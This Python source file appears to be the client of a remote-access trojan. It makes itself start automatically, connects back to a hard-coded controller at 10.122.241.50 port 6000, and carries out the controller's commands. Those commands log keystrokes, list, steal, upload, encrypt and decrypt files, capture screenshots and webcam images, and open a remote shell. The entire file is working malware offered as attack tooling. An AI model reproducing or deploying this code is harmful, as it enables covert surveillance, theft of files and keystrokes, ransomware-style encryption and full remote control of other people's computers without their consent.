from attack import keylogger, filecontroller, screenshotter, camera, shell, messagebox
from trojan import trojan
import PyHook3 as pyHook
import socket
import time
import json
import threading
import os

trojan.autostart(filename=os.path.basename(__file__),
                 current_file=os.path.splitext(os.path.basename(__file__))[0],
                 abspath=os.path.abspath(os.path.dirname(__file__)))
trojan.trojan_init()
while 1:
    try:
        ghost_clint = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ghost_clint.connect(("10.122.241.50", 6000))

        while 1:
            try:
                command = ghost_clint.recv(1024).decode()
                print(command)
                if command == 'get_keyboard\x00':
                    event = pyHook.HookManager()
                    key_thread = threading.Thread(target=keylogger.key_thread, args=(ghost_clint, event))
                    key_thread.start()
                    stop_cmd = ghost_clint.recv(128).decode().strip("\x00")
                    if stop_cmd == "stop":
                        event.UnhookKeyboard()
                        ghost_clint.send(b'stop')
                elif command == 'get_file_list\x00':
                    path = ghost_clint.recv(1024).decode().strip("\x00")
                    print(json.dumps(filecontroller.get_path(path)))
                    ghost_clint.send(json.dumps(filecontroller.get_path(path)).encode('utf-8'))
                elif command == 'file_download\x00':
                    path = ghost_clint.recv(1024).decode('UTF-8', 'ignore').strip().strip(b'\x00'.decode())
                    data = filecontroller.file_download(path)
                    ghost_clint.sendall(data)
                    time.sleep(2)
                    ghost_clint.send(b'end')
                elif command == 'file_upload\x00':
                    filecontroller.file_upload(ghost_clint)
                elif command == 'file_encrypt\x00':
                    path = ghost_clint.recv(1024).decode('UTF-8', 'ignore').strip().strip(b'\x00'.decode())
                    filecontroller.file_encrypt(path)
                elif command == 'file_decrypt\x00':
                    path = ghost_clint.recv(1024).decode('UTF-8', 'ignore').strip().strip(b'\x00'.decode())
                    filecontroller.file_decrypt(path)
                elif command == "file_information\x00":
                    path = ghost_clint.recv(1024).decode('UTF-8', 'ignore').strip().strip(b'\x00'.decode())
                    ghost_clint.send(json.dumps(filecontroller.file_information(path)).encode())
                elif command == 'screenshot' or command == 'screenshot\x00':
                    screenshotter.screenshotter(ghost_clint)
                elif command == 'camera' or command == 'camera\x00':
                    camera.camera(ghost_clint)
                elif command == 'shell_start\x00':
                    ghost_clint.send("connection successful".encode())
                    time.sleep(0.5)
                    shell.shell(ghost_clint)
                elif command == 'messagebox\x00':
                    message = ghost_clint.recv(1024).decode()
                    messagebox.my_message(message)
                elif command == 'exit\x00':
                    break
                else:
                    continue
            except ConnectionResetError:
                break
    except TimeoutError:
        continue
    except ConnectionRefusedError:
        continue
    except FileNotFoundError:
        continue
